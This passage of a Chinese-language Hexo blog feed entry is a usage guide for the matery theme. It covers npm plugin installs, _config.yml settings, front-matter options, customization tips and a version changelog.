title="代码高亮"></a>代码高亮</h3><p>由于 Hexo 自带的代码高亮主题显示不好看，所以主题中使用到了 <a href="https://github.com/ele828/hexo-prism-plugin" target="_blank" rel="noopener">hexo-prism-plugin</a> 的 Hexo 插件来做代码高亮，安装命令如下：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> i -S hexo-prism-plugin</code></pre><p>然后，修改 Hexo 根目录下 <code>_config.yml</code> 文件中 <code>highlight.enable</code> 的值为 <code>false</code>，并新增 <code>prism</code> 插件相关的配置，主要配置如下：</p><pre class=" language-yaml"><code class="language-yaml"><span class="token key atrule">highlight</span><span class="token punctuation">:</span>  <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">false</span><span class="token key atrule">prism_plugin</span><span class="token punctuation">:</span>  <span class="token key atrule">mode</span><span class="token punctuation">:</span> <span class="token string">'preprocess'</span>    <span class="token comment" spellcheck="true"># realtime/preprocess</span>  <span class="token key atrule">theme</span><span class="token punctuation">:</span> <span class="token string">'tomorrow'</span>  <span class="token key atrule">line_number</span><span class="token punctuation">:</span> <span class="token boolean important">false    </span><span class="token comment" spellcheck="true"># default false</span>  custom_css<span class="token punctuation">:</span></code></pre><h3 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h3><p>本主题中还使用到了 <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener">hexo-generator-search</a> 的 Hexo 插件来做内容搜索，安装命令如下：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-generator-search --save</code></pre><p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p><pre class=" language-yaml"><code class="language-yaml"><span class="token key atrule">search</span><span class="token punctuation">:</span>  <span class="token key atrule">path</span><span class="token punctuation">:</span> search.xml  <span class="token key atrule">field</span><span class="token punctuation">:</span> post</code></pre><h3 id="中文链接转拼音（建议安装）"><a href="#中文链接转拼音（建议安装）" class="headerlink" title="中文链接转拼音（建议安装）"></a>中文链接转拼音（建议安装）</h3><p>如果你的文章名称是中文的，那么 Hexo 默认生成的永久链接也会有中文，这样不利于 <code>SEO</code>，且 <code>gitment</code> 评论对中文链接也不支持。我们可以用 <a href="https://github.com/viko16/hexo-permalink-pinyin" target="_blank" rel="noopener">hexo-permalink-pinyin</a> Hexo 插件使在生成文章时生成中文拼音的永久链接。</p><p>安装命令如下：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> i hexo-permalink-pinyin --save</code></pre><p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p><pre class=" language-yaml"><code class="language-yaml"><span class="token key atrule">permalink_pinyin</span><span class="token punctuation">:</span>  <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">separator</span><span class="token punctuation">:</span> <span class="token string">'-'</span> <span class="token comment" spellcheck="true"># default: '-'</span></code></pre><blockquote><p><strong>注</strong>：除了此插件外，<a href="https://github.com/rozbo/hexo-abbrlink" target="_blank" rel="noopener">hexo-abbrlink</a> 插件也可以生成非中文的链接。</p></blockquote><h3 id="文章字数统计插件（建议安装）"><a href="#文章字数统计插件（建议安装）" class="headerlink" title="文章字数统计插件（建议安装）"></a>文章字数统计插件（建议安装）</h3><p>如果你想要在文章中显示文章字数、阅读时长信息，可以安装 <a href="https://github.com/willin/hexo-wordcount" target="_blank" rel="noopener">hexo-wordcount</a>插件。</p><p>安装命令如下：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> i --save hexo-wordcount</code></pre><p>然后只需在本主题下的 <code>_config.yml</code> 文件中，将各个文章字数相关的配置激活即可：</p><pre class=" language-yaml"><code class="language-yaml"><span class="token key atrule">postInfo</span><span class="token punctuation">:</span>  <span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">update</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>  <span class="token key atrule">wordCount</span><span class="token punctuation">:</span> <span class="token boolean important">false </span><span class="token comment" spellcheck="true"># 设置文章字数统计为 true.</span>  <span class="token key atrule">totalCount</span><span class="token punctuation">:</span> <span class="token boolean important">false </span><span class="token comment" spellcheck="true"># 设置站点文章总字数统计为 true.</span>  <span class="token key atrule">min2read</span><span class="token punctuation">:</span> <span class="token boolean important">false </span><span class="token comment" spellcheck="true"># 阅读时长.</span>  <span class="token key atrule">readCount</span><span class="token punctuation">:</span> <span class="token boolean important">false </span><span class="token comment" spellcheck="true"># 阅读次数.</span></code></pre><h3 id="添加emoji表情支持（可选的）"><a href="#添加emoji表情支持（可选的）" class="headerlink" title="添加emoji表情支持（可选的）"></a>添加emoji表情支持（可选的）</h3><p>本主题新增了对<code>emoji</code>表情的支持，使用到了 <a href="https://npm.taobao.org/package/hexo-filter-github-emojis" target="_blank" rel="noopener">hexo-filter-github-emojis</a> 的 Hexo 插件来支持 <code>emoji</code>表情的生成，把对应的<code>markdown emoji</code>语法（<code>::</code>,例如：<code>:smile:</code>）转变成会跳跃的<code>emoji</code>表情，安装命令如下：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-filter-github-emojis --save</code></pre><p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p><pre class=" language-yaml"><code class="language-yaml"><span class="token key atrule">githubEmojis</span><span class="token punctuation">:</span>  <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">className</span><span class="token punctuation">:</span> github<span class="token punctuation">-</span>emoji  <span class="token key atrule">inject</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">styles</span><span class="token punctuation">:</span>  customEmojis<span class="token punctuation">:</span></code></pre><h3 id="添加-RSS-订阅支持（可选的）"><a href="#添加-RSS-订阅支持（可选的）" class="headerlink" title="添加 RSS 订阅支持（可选的）"></a>添加 RSS 订阅支持（可选的）</h3><p>本主题中还使用到了 <a href="https://github.com/hexojs/hexo-generator-feed" target="_blank" rel="noopener">hexo-generator-feed</a> 的 Hexo 插件来做 <code>RSS</code>，安装命令如下：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-generator-feed --save</code></pre><p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p><pre class=" language-yaml"><code class="language-yaml"><span class="token key atrule">feed</span><span class="token punctuation">:</span>  <span class="token key atrule">type</span><span class="token punctuation">:</span> atom  <span class="token key atrule">path</span><span class="token punctuation">:</span> atom.xml  <span class="token key atrule">limit</span><span class="token punctuation">:</span> <span class="token number">20</span>  <span class="token key atrule">hub</span><span class="token punctuation">:</span>  <span class="token key atrule">content</span><span class="token punctuation">:</span>  <span class="token key atrule">content_limit</span><span class="token punctuation">:</span> <span class="token number">140</span>  <span class="token key atrule">content_limit_delim</span><span class="token punctuation">:</span> <span class="token string">' '</span>  <span class="token key atrule">order_by</span><span class="token punctuation">:</span> <span class="token punctuation">-</span>date</code></pre><p>执行 <code>hexo clean &amp;&amp; hexo g</code> 重新生成博客文件，然后在 <code>public</code> 文件夹中即可看到 <code>atom.xml</code> 文件，说明你已经安装成功了。</p><h3 id="添加-DaoVoice-在线聊天功能（可选的）"><a href="#添加-DaoVoice-在线聊天功能（可选的）" class="headerlink" title="添加 DaoVoice 在线聊天功能（可选的）"></a>添加 <a href="http://www.daovoice.io/" target="_blank" rel="noopener">DaoVoice</a> 在线聊天功能（可选的）</h3><p>前往 <a href="http://www.daovoice.io/" target="_blank" rel="noopener">DaoVoice</a> 官网注册并且获取 <code>app_id</code>，并将 <code>app_id</code> 填入主题的 <code>_config.yml</code> 文件中。</p><h3 id="添加-Tidio-在线聊天功能（可选的）"><a href="#添加-Tidio-在线聊天功能（可选的）" class="headerlink" title="添加 Tidio 在线聊天功能（可选的）"></a>添加 <a href="https://www.tidio.com/" target="_blank" rel="noopener">Tidio</a> 在线聊天功能（可选的）</h3><p>前往 <a href="https://www.tidio.com/" target="_blank" rel="noopener">Tidio</a> 官网注册并且获取 <code>Public Key</code>，并将 <code>Public Key</code> 填入主题的 <code>_config.yml</code> 文件中。</p><h3 id="修改页脚"><a href="#修改页脚" class="headerlink" title="修改页脚"></a>修改页脚</h3><p>页脚信息可能需要做定制化修改，而且它不便于做成配置信息，所以可能需要你自己去再修改和加工。修改的地方在主题文件的 <code>/layout/_partial/footer.ejs</code> 文件中，包括站点、使用的主题、访问量等。</p><h3 id="修改社交链接"><a href="#修改社交链接" class="headerlink" title="修改社交链接"></a>修改社交链接</h3><p>在主题的 <code>_config.yml</code> 文件中，默认支持 <code>QQ</code>、<code>GitHub</code> 和邮箱等的配置，你可以在主题文件的 <code>/layout/_partial/social-link.ejs</code> 文件中，新增、修改你需要的社交链接地址，增加链接可参考如下代码：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">if</span> <span class="token attr-name">(theme.socialLink.github)</span> <span class="token attr-name">{</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&lt;%<span class="token punctuation">=</span> theme.socialLink.github %<span class="token punctuation">></span><span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>tooltipped<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span> <span class="token attr-name">data-tooltip</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>访问我的GitHub<span class="token punctuation">"</span></span> <span class="token attr-name">data-position</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>top<span class="token punctuation">"</span></span> <span class="token attr-name">data-delay</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fab fa-github<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">}</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span></code></pre><p>其中，社交图标（如：<code>fa-github</code>）你可以在 <a href="https://fontawesome.com/icons" target="_blank" rel="noopener">Font Awesome</a> 中搜索找到。以下是常用社交图标的标识，供你参考：</p><ul><li>Facebook: <code>fab fa-facebook</code></li><li>Twitter: <code>fab fa-twitter</code></li><li>Google-plus: <code>fab fa-google-plus</code></li><li>Linkedin: <code>fab fa-linkedin</code></li><li>Tumblr: <code>fab fa-tumblr</code></li><li>Medium: <code>fab fa-medium</code></li><li>Slack: <code>fab fa-slack</code></li><li>Sina Weibo: <code>fab fa-weibo</code></li><li>Wechat: <code>fab fa-weixin</code></li><li>QQ: <code>fab fa-qq</code></li><li>Zhihu: <code>fab fa-zhihu</code></li></ul><blockquote><p><strong>注意</strong>: 本主题中使用的 <code>Font Awesome</code> 版本为 <code>5.11.0</code>。</p></blockquote><h3 id="修改打赏的二维码图片"><a href="#修改打赏的二维码图片" class="headerlink" title="修改打赏的二维码图片"></a>修改打赏的二维码图片</h3><p>在主题文件的 <code>source/medias/reward</code> 文件中，你可以替换成你的的微信和支付宝的打赏二维码图片。</p><h3 id="配置音乐播放器（可选的）"><a href="#配置音乐播放器（可选的）" class="headerlink" title="配置音乐播放器（可选的）"></a>配置音乐播放器（可选的）</h3><p>要支持音乐播放，就必须开启音乐的播放配置和音乐数据的文件。</p><p>首先，在你的博客 <code>source</code> 目录下的 <code>_data</code> 目录（没有的话就新建一个）中新建 <code>musics.json</code> 文件，文件内容如下所示：</p><pre class=" language-json"><code class="language-json"><span class="token punctuation">[</span><span class="token punctuation">{</span>    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"五月雨变奏电音"</span><span class="token punctuation">,</span>    <span class="token property">"artist"</span><span class="token operator">:</span> <span class="token string">"AnimeVibe"</span><span class="token punctuation">,</span>    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"http://xxx.com/music1.mp3"</span><span class="token punctuation">,</span>    <span class="token property">"cover"</span><span class="token operator">:</span> <span class="token string">"http://xxx.com/music-cover1.png"</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"Take me hand"</span><span class="token punctuation">,</span>    <span class="token property">"artist"</span><span class="token operator">:</span> <span class="token string">"DAISHI DANCE,Cecile Corbel"</span><span class="token punctuation">,</span>    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"/medias/music/music2.mp3"</span><span class="token punctuation">,</span>    <span class="token property">"cover"</span><span class="token operator">:</span> <span class="token string">"/medias/music/cover2.png"</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"Shape of You"</span><span class="token punctuation">,</span>    <span class="token property">"artist"</span><span class="token operator">:</span> <span class="token string">"J.Fla"</span><span class="token punctuation">,</span>    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"http://xxx.com/music3.mp3"</span><span class="token punctuation">,</span>    <span class="token property">"cover"</span><span class="token operator">:</span> <span class="token string">"http://xxx.com/music-cover3.png"</span><span class="token punctuation">}</span><span class="token punctuation">]</span></code></pre><blockquote><p><strong>注</strong>：以上 JSON 中的属性：<code>name</code>、<code>artist</code>、<code>url</code>、<code>cover</code> 分别表示音乐的名称、作者、音乐文件地址、音乐封面。</p></blockquote><p>然后，在主题的 <code>_config.yml</code> 配置文件中激活配置即可：</p><pre class=" language-yaml"><code class="language-yaml"><span class="token comment" spellcheck="true"># 是否在首页显示音乐.</span><span class="token key atrule">music</span><span class="token punctuation">:</span>  <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">showTitle</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>  <span class="token key atrule">title</span><span class="token punctuation">:</span> 听听音乐  <span class="token key atrule">fixed</span><span class="token punctuation">:</span> <span class="token boolean important">false </span><span class="token comment" spellcheck="true"># 是否开启吸底模式</span>  <span class="token key atrule">autoplay</span><span class="token punctuation">:</span> <span class="token boolean important">false </span><span class="token comment" spellcheck="true"># 是否自动播放</span>  <span class="token key atrule">theme</span><span class="token punctuation">:</span> '<span class="token comment" spellcheck="true">#42b983'</span>  <span class="token key atrule">loop</span><span class="token punctuation">:</span> <span class="token string">'all'</span> <span class="token comment" spellcheck="true"># 音频循环播放, 可选值: 'all', 'one', 'none'</span>  <span class="token key atrule">order</span><span class="token punctuation">:</span> <span class="token string">'list'</span> <span class="token comment" spellcheck="true"># 音频循环顺序, 可选值: 'list', 'random'</span>  <span class="token key atrule">preload</span><span class="token punctuation">:</span> <span class="token string">'auto'</span> <span class="token comment" spellcheck="true"># 预加载，可选值: 'none', 'metadata', 'auto'</span>  <span class="token key atrule">volume</span><span class="token punctuation">:</span> <span class="token number">0.7 </span><span class="token comment" spellcheck="true"># 默认音量，请注意播放器会记忆用户设置，用户手动设置音量后默认音量即失效</span>  <span class="token key atrule">listFolded</span><span class="token punctuation">:</span> <span class="token boolean important">false </span><span class="token comment" spellcheck="true"># 列表默认折叠</span>  <span class="token key atrule">listMaxHeight</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># 列表最大高度</span></code></pre><h2 id="文章-Front-matter-介绍"><a href="#文章-Front-matter-介绍" class="headerlink" title="文章 Front-matter 介绍"></a>文章 Front-matter 介绍</h2><h3 id="Front-matter-选项详解"><a href="#Front-matter-选项详解" class="headerlink" title="Front-matter 选项详解"></a>Front-matter 选项详解</h3><p><code>Front-matter</code> 选项中的所有内容均为<strong>非必填</strong>的。但我仍然建议至少填写 <code>title</code> 和 <code>date</code> 的值。</p><table><thead><tr><th>配置选项</th><th>默认值</th><th>描述</th></tr></thead><tbody><tr><td>title</td><td><code>Markdown</code> 的文件标题</td><td>文章标题，强烈建议填写此选项</td></tr><tr><td>date</td><td>文件创建时的日期时间</td><td>发布时间，强烈建议填写此选项，且最好保证全局唯一</td></tr><tr><td>author</td><td>根 <code>_config.yml</code> 中的 <code>author</code></td><td>文章作者</td></tr><tr><td>img</td><td><code>featureImages</code> 中的某个值</td><td>文章特征图，推荐使用图床(腾讯云、七牛云、又拍云等)来做图片的路径.如: <code>http://xxx.com/xxx.jpg</code></td></tr><tr><td>top</td><td><code>true</code></td><td>推荐文章（文章是否置顶），如果 <code>top</code> 值为 <code>true</code>，则会作为首页推荐文章</td></tr><tr><td>cover</td><td><code>false</code></td><td><code>v1.0.2</code>版本新增，表示该文章是否需要加入到首页轮播封面中</td></tr><tr><td>coverImg</td><td>无</td><td><code>v1.0.2</code>版本新增，表示该文章在首页轮播封面需要显示的图片路径，如果没有，则默认使用文章的特色图片</td></tr><tr><td>password</td><td>无</td><td>文章阅读密码，如果要对文章设置阅读验证密码的话，就可以设置 <code>password</code> 的值，该值必须是用 <code>SHA256</code> 加密后的密码，防止被他人识破。前提是在主题的 <code>config.yml</code> 中激活了 <code>verifyPassword</code> 选项</td></tr><tr><td>toc</td><td><code>true</code></td><td>是否开启 TOC，可以针对某篇文章单独关闭 TOC 的功能。前提是在主题的 <code>config.yml</code> 中激活了 <code>toc</code> 选项</td></tr><tr><td>mathjax</td><td><code>false</code></td><td>是否开启数学公式支持 ，本文章是否开启 <code>mathjax</code>，且需要在主题的 <code>_config.yml</code> 文件中也需要开启才行</td></tr><tr><td>summary</td><td>无</td><td>文章摘要，自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要</td></tr><tr><td>categories</td><td>无</td><td>文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类</td></tr><tr><td>tags</td><td>无</td><td>文章标签，一篇文章可以多个标签</td></tr><tr><td>keywords</td><td>文章标题</td><td>文章关键字，SEO 时需要</td></tr><tr><td>reprintPolicy</td><td>cc_by</td><td>文章转载规则， 可以是 cc_by, cc_by_nd, cc_by_sa, cc_by_nc, cc_by_nc_nd, cc_by_nc_sa, cc0, noreprint 或 pay 中的一个</td></tr></tbody></table><blockquote><p><strong>注意</strong>:</p><ol><li>如果 <code>img</code> 属性不填写的话，文章特色图会根据文章标题的 <code>hashcode</code> 的值取余，然后选取主题中对应的特色图片，从而达到让所有文章都的特色图<strong>各有特色</strong>。</li><li><code>date</code> 的值尽量保证每篇文章是唯一的，因为本主题中 <code>Gitalk</code> 和 <code>Gitment</code> 识别 <code>id</code> 是通过 <code>date</code> 的值来作为唯一标识的。</li><li>如果要对文章设置阅读验证密码的功能，不仅要在 Front-matter 中设置采用了 SHA256 加密的 password 的值，还需要在主题的 <code>_config.yml</code> 中激活了配置。有些在线的 SHA256 加密的地址，可供你使用：<a href="http://tool.oschina.net/encrypt?type=2" target="_blank" rel="noopener">开源中国在线工具</a>、<a href="http://encode.chahuo.com/" target="_blank" rel="noopener">chahuo</a>、<a href="http://tool.chinaz.com/tools/hash.aspx" target="_blank" rel="noopener">站长工具</a>。</li><li>您可以在文章md文件的 front-matter 中指定 reprintPolicy 来给单个文章配置转载规则</li></ol></blockquote><p>以下为文章的 <code>Front-matter</code> 示例。</p><h3 id="最简示例"><a href="#最简示例" class="headerlink" title="最简示例"></a>最简示例</h3><pre class=" language-yaml"><code class="language-yaml"><span class="token punctuation">---</span><span class="token key atrule">title</span><span class="token punctuation">:</span> typora<span class="token punctuation">-</span>vue<span class="token punctuation">-</span>theme主题介绍<span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token datetime number">2018-09-07 09:25:00</span><span class="token punctuation">---</span></code></pre><h3 id="最全示例"><a href="#最全示例" class="headerlink" title="最全示例"></a>最全示例</h3><pre class=" language-yaml"><code class="language-yaml"><span class="token punctuation">---</span><span class="token key atrule">title</span><span class="token punctuation">:</span> typora<span class="token punctuation">-</span>vue<span class="token punctuation">-</span>theme主题介绍<span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token datetime number">2018-09-07 09:25:00</span><span class="token key atrule">author</span><span class="token punctuation">:</span> 赵奇<span class="token key atrule">img</span><span class="token punctuation">:</span> /source/images/xxx.jpg<span class="token key atrule">top</span><span class="token punctuation">:</span> <span class="token boolean important">true</span><span class="token key atrule">cover</span><span class="token punctuation">:</span> <span class="token boolean important">true</span><span class="token key atrule">coverImg</span><span class="token punctuation">:</span> /images/1.jpg<span class="token key atrule">password</span><span class="token punctuation">:</span> 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92<span class="token key atrule">toc</span><span class="token punctuation">:</span> <span class="token boolean important">false</span><span class="token key atrule">mathjax</span><span class="token punctuation">:</span> <span class="token boolean important">false</span><span class="token key atrule">summary</span><span class="token punctuation">:</span> 这是你自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要<span class="token key atrule">categories</span><span class="token punctuation">:</span> Markdown<span class="token key atrule">tags</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> Typora  <span class="token punctuation">-</span> Markdown<span class="token punctuation">---</span></code></pre><h2 id="效果截图"><a href="#效果截图" class="headerlink" title="效果截图"></a>效果截图</h2><p><img src="http://static.blinkfox.com/matery-20181202-1.png" alt="首页"></p><p><img src="http://static.blinkfox.com/matery-20181202-2.png" alt="首页推荐文章"></p><p><img src="http://static.blinkfox.com/matery-20181202-3.png" alt="首页文章列表"></p><p><img src="http://static.blinkfox.com/matery-20181202-7.png" alt="首页文章列表"></p><p><img src="http://static.blinkfox.com/matery-20181202-8.png" alt="首页文章列表"></p><h2 id="自定制修改"><a href="#自定制修改" class="headerlink" title="自定制修改"></a>自定制修改</h2><p>在本主题的 <code>_config.yml</code> 中可以修改部分自定义信息，有以下几个部分：</p><ul><li>菜单</li><li>我的梦想</li><li>首页的音乐播放器和视频播放器配置</li><li>是否显示推荐文章名称和按钮配置</li><li><code>favicon</code> 和 <code>Logo</code></li><li>个人信息</li><li>TOC 目录</li><li>文章打赏信息</li><li>复制文章内容时追加版权信息</li><li>MathJax</li><li>文章字数统计、阅读时长</li><li>点击页面的’爱心’效果</li><li>我的项目</li><li>我的技能</li><li>我的相册</li><li><code>Gitalk</code>、<code>Gitment</code>、<code>Valine</code> 和 <code>disqus</code> 评论配置</li><li><a href="http://busuanzi.ibruce.info/" target="_blank" rel="noopener">不蒜子统计</a>和谷歌分析（<code>Google Analytics</code>）</li><li>默认特色图的集合。当文章没有设置特色图时，本主题会根据文章标题的 <code>hashcode</code> 值取余，来选择展示对应的特色图</li></ul><p><strong>我认为个人博客应该都有自己的风格和特色</strong>。如果本主题中的诸多功能和主题色彩你不满意，可以在主题中自定义修改，很多更自由的功能和细节点的修改难以在主题的 <code>_config.yml</code> 中完成，需要修改源代码才来完成。以下列出了可能对你有用的地方：</p><h3 id="修改主题颜色"><a href="#修改主题颜色" class="headerlink" title="修改主题颜色"></a>修改主题颜色</h3><p>在主题文件的 <code>/source/css/matery.css</code> 文件中，搜索 <code>.bg-color</code> 来修改背景颜色：</p><pre class=" language-css"><code class="language-css"><span class="token comment" spellcheck="true">/* 整体背景颜色，包括导航、移动端的导航、页尾、标签页等的背景颜色. */</span><span class="token selector"><span class="token class">.bg-color</span> </span><span class="token punctuation">{</span>    <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token function">linear-gradient</span><span class="token punctuation">(</span>to right, <span class="token hexcode">#4cbf30</span> <span class="token number">0%</span>, <span class="token hexcode">#0f9d58</span> <span class="token number">100%</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token atrule"><span class="token rule">@-webkit-keyframes</span> rainbow</span> <span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">/* 动态切换背景颜色. */</span><span class="token punctuation">}</span><span class="token atrule"><span class="token rule">@keyframes</span> rainbow</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/* 动态切换背景颜色. */</span><span class="token punctuation">}</span></code></pre><h3 id="修改-banner-图和文章特色图"><a href="#修改-banner-图和文章特色图" class="headerlink" title="修改 banner 图和文章特色图"></a>修改 banner 图和文章特色图</h3><p>你可以直接在 <code>/source/medias/banner</code> 文件夹中更换你喜欢的 <code>banner</code> 图片，主题代码中是每天动态切换一张，只需 <code>7</code> 张即可。如果你会 <code>JavaScript</code> 代码，可以修改成你自己喜欢切换逻辑，如：随机切换等，<code>banner</code> 切换的代码位置在 <code>/layout/_partial/bg-cover-content.ejs</code> 文件的 <code>&lt;script&gt;&lt;/script&gt;</code> 代码中：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.bg-cover'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">'background-image'</span><span class="token punctuation">,</span> <span class="token string">'url(/medias/banner/'</span> <span class="token operator">+</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDay</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.jpg)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>在 <code>/source/medias/featureimages</code> 文件夹中默认有 24 张特色图片，你可以再增加或者减少，并需要在 <code>_config.yml</code> 做同步修改。</p><h2 id="版本记录"><a href="#版本记录" class="headerlink" title="版本记录"></a>版本记录</h2><ul><li>v1.2.2<ul><li>新增了自定义文章 <code>keywords</code> 的功能；</li><li>新增静态彩带点击切换的功能和配置；</li><li>将文章字数统计、彩带和站点运行时间等功能默认设置为 <code>false</code>；</li><li>修改了文章的 <code>description</code> 的 meta 属性优先读取文章的 <code>summary</code> 属性；</li><li>修改了文章标题的 HTML 标签，从 <code>div</code> 改成了 <code>h1</code> 标题；</li><li>修改了页脚年份显示不正确的问题；</li><li>去掉了站点运行时间中多余的 <code>setTimeout</code> 代码；</li></ul></li><li>v1.2.1<ul><li>新增了 TOC 的展开目录层级设置和滚动条功能，防止目录较多的时候目录溢出；</li><li>修改了首页的展示方式为以前的模式；</li><li>修复首页按钮没有边框的问题；</li><li>修复了音乐及吸底模式、视频、推荐文章等不激活时仍然生成首页卡片的问题；</li><li>修复 wordCount 插件未安装的问题，修改了部分配置；</li><li>修复音乐的 JSON 配置中有单引号的情况页面不显示的音乐的问题</li><li>修复标签云在Hexo4.0下链接失效的问题；</li></ul></li><li>v1.2.0<ul><li>新增了 <a href="http://www.daovoice.io/" target="_blank" rel="noopener">DaoVoice</a>、<a href="https://www.tidio.com/" target="_blank" rel="noopener">Tidio</a> 的在线聊天功能；</li><li>新增了两级菜单的功能；</li><li>新增了打字效果的副标题；</li><li>新增了网页内容预加载的功能；</li><li>新增了首页 banner 是否每日切换的配置功能；</li><li>新增了显示 ICP 备案信息的功能，默认未开启；</li><li>新增了百度分析的配置；</li><li>新增了代码块的语言显示、一键复制、显示行号等功能；</li><li>新增了首页轮播图和推荐文章可自定义配置的功能；</li><li>新增了文章页面显示更新日期；</li><li>新增了转载规则的图标；</li><li>修改了分享的布局和显示方式；</li><li>升级更新了部分依赖库的版本；</li><li>其他细节修改和优化；</li></ul></li><li>v1.1.0<ul><li>新增了 <code>emoji</code> 的支持；</li><li>新增了站点运行时间统计及配置；</li><li>新增了留言板的功能,默认未开启；</li><li>新增了 <code>Twitter</code>、<code>Facebook</code>、知乎的社交链接；</li><li>更新了 <code>Valine</code> 的版本为最新版；</li><li>其他小细节的修改；</li></ul></li><li>v1.0.4<ul><li>新增了能为每篇文章都自定义转载规则的功能；</li><li>修复上一页、下一页的自定义 <code>summary</code> 不显示的问题；</li><li>修复了友情链接显示错位的问题，改为了瀑布流的布局方式；</li><li>其他小细节 bug 的修改；</li></ul></li><li>v1.0.3<ul><li>新增了<code>TOC</code>展开、收缩的按钮和相关配置，默认显示此按钮；</li></ul></li><li>v1.0.2<ul><li>升级了 <a href="https://materializecss.com/" target="_blank" rel="noopener">Materialize</a> 框架版本为<code>1.0.0</code>，重构和修改了升级过程中的部分文件或问题；</li><li>新增了首页封面的全屏轮播特效，可以将更重要的文章设置到首页轮播中；</li><li>修复首页第一个按钮是中文的问题</li><li>修复了 iPhone 上点击搜索输入获取焦点的问题；</li><li>修复了 iPhone 上输入框获取焦点后页面放大的问题；</li><li>修复一些文章或 UI 显示问题；</li></ul></li><li>v1.0.1<ul><li>调整 <code>css</code>、<code>js</code> 的文件请求路径在主题的<code>_config.yml</code>中配置，便于你更快捷的配置自己的 CDN；</li><li>新增代码是否折行为可配置，默认为折行；</li><li>默认激活 <code>TOC</code> 功能，并新增为某篇文章关闭 <code>TOC</code> 的 <code>Front-matter</code> 配置选项；</li><li>修复文章滚动时，高亮的目录选项不准确的问题；</li><li><code>IOS</code>下移除搜索框自动获得焦点属性，防止自动获得焦点后导致视图上移；</li></ul></li><li>v1.0.0<ul><li>新增了所有基础功能；</li></ul></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> matery使用指南 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
